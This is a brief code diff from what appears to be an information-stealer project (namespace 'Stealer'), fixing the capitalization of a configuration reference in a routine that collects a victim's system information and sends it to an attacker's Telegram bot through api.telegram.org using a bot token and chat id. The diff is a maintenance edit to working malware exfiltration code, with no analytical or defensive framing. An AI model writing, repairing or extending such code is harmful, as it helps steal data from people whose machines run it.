@@ -14,13 +14,13 @@ namespace dominion.src.dominion.Stealer.General
 
         public async Task SendHelloMessage()
         {
-            var url = $"https://api.telegram.org/bot{configuration.configuration.TelegramBotToken}/sendMessage";
+            var url = $"https://api.telegram.org/bot{configuration.Configuration.TelegramBotToken}/sendMessage";
             
             var systemInfo = GetSystemInfo();
             
             var payload = new
             {
-                chat_id = configuration.configuration.TelegramChatId,
+                chat_id = configuration.Configuration.TelegramChatId,
                 text = systemInfo
             };
 
